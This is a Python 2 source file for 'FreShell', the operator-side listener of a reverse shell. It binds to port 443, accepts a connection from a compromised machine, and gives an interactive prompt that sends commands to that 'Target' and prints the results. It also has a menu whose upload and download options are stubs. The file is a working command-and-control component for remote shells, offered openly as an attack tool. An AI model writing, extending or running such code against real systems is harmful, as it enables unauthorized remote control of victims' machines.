import os
import socket
import subprocess
import sys

host = ''
port = 443

def banner():
    print "\n[+] Freshnut's FreShell, a simple python reverse shell. [+]\n"
    print """
===============================================================================
@@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@!       @@!  @@@  @@!       !@@       @@!  @@@  @@!       @@!       @@!       
!@!       !@!  @!@  !@!       !@!       !@!  @!@  !@!       !@!       !@!       
@!!!:!    @!@!!@!   @!!!:!    !!@@!!    @!@!@!@!  @!!!:!    @!!       @!!       
!!!!!:    !!@!@!    !!!!!:     !!@!!!   !!!@!!!!  !!!!!:    !!!       !!!       
!!:       !!: :!!   !!:            !:!  !!:  !!!  !!:       !!:       !!:       
:!:       :!:  !:!  :!:           !:!   :!:  !:!  :!:        :!:       :!:      
 ::       ::   :::   :: ::::  :::: ::   ::   :::   :: ::::   :: ::::   :: ::::  
 :         :   : :  : :: ::   :: : :     :   : :  : :: ::   : :: : :  : :: : :  
==============================================================================

Awaiting for connection.."""

def menu():
    if addr:
            os.system("clear")
            sys.stdout.write("[+] Connected: ")
            print addr
    options = """
Options:

  1               Interactive Shell
                  Type "quit" to return to menu from Interactive Shell
  2               Upload File
  3               Download File
  4               Target List
  quit            Quit
  help            Display Options
  disconnect      Disconnect from Client"""
    print options
    while True:
        choice = raw_input("> ")
        if choice == "1":
            print "[+] Entering Shell\n"
            command()
        elif choice == "2":
            print "Send File"
        elif choice == "3":
            print "Download File"
        elif choice == "4":
            sys.stdout.write("Target: ")
            print addr
        elif choice == "quit":
            print "[+] Exit"
            conn.close()
            s.close()
            exit()
        elif choice == "help":
            os.system("clear")
            print options
        elif choice == "disconnect":
            print "[+] Disconnecting Target"
            conn.send("disconnect")
            conn.close()

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def bind():
    s.bind((host, port))

def accept():
    s.listen(2)
    global conn, addr
    conn, addr = s.accept()

def command():
    # cwd = conn.recv(1024)	# Get CWD on intial connection
    while True:
        # sys.stdout.write(cwd)
        cmd = raw_input("#> ")
        conn.send(cmd)
        if cmd == "quit":
            print " [-] Disconnected"
            menu()
        else:
            data = conn.recv(4096)
            sys.stdout.write(data)
            sys.stdout.flush()

def main():
    banner()
    connect()
    bind()
    accept()
    menu()
    s.close()

main()
